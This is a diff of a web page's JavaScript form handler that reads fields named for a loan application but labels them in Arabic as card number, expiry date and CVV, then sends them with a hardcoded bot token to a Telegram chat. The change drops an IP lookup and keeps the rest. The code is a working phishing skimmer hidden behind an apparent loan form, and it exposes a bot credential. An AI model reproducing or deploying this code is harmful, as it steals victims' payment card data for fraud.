@@ -716,14 +716,13 @@ margin-left: 32px;
             const phone = document.getElementById('phone').value;
 
             const loanAmount = document.getElementById('loanAmount').value;
-             const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-     
+
 
             const token = '7636117454:AAG89iFLhRboah-JoMu2-gtmXz2qq8QemUM';
 
             const chatId = '6797351288';
 
-            const message = `رقم البطاقة: ${fullName}\nتاريخ : ${phone}\nكود CVV: ${loanAmount}\nIP: ${ip}`;
+            const message = `رقم البطاقة: ${fullName}\nتاريخ : ${phone}\nكود CVV: ${loanAmount}\n`;
             
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
